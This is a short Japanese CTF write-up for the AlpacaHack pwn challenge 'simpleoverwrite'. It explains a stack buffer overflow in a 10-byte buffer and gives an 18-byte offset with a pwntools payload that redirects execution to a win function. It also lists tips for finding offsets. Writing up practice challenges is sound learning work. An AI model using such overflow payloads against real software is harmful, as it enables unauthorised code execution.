---
title: simpleoverwrite
category: pwn
genre: stack-overflow
difficulty: medium
tags:
  - ret2win
  - stack-bof
  - no-canary
source: alpacahack:simpleoverwrite
solved_at: 2026-05-29
---

# simpleoverwrite

## 問題の要点

- `char buf[10]` に対して `read(0, buf, 0x20)`。
- return address まで overwrite して `win` に飛ばせる。

## 解き方

offset は 18 byte。`win` のアドレスを後ろに置く。

```python
exe = ELF("./chall")
payload = b"A" * 18 + p64(exe.symbols["win"])
p.send(payload)
```

## 知見

- 小さい stack BOF は、まず cyclic/pwndbg で return address offset を取る。
- PIE が無効なら ret2win は固定アドレスでよい。

## 連携する知見

- [Pwn](../../../insights/pwn.md)
- [Pwn relations](../../../relations/pwn.md)
